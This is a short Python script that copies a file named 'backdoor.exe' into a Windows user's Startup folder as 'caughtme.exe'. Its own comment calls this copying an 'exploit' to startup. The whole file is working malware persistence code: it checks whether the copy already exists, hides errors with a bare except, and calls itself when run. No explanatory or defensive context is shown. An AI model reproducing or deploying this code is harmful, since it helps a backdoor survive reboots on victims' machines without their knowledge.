import os
import shutil

#responsible for copying exploit to startup
def persistent():
    try:
        filepath = r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ '
        actual_filepath = os.path.join(r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ ', 'caughtme.exe')
        if os.path.exists(actual_filepath):
            return
        else: 
            source_file = open('backdoor.exe', 'rb')
            os.chdir(filepath)
            destination_file = open('caughtme.exe', 'wb')
            shutil.copyfileobj(source_file, destination_file)
    except Exception as err:
        pass
    
persistent()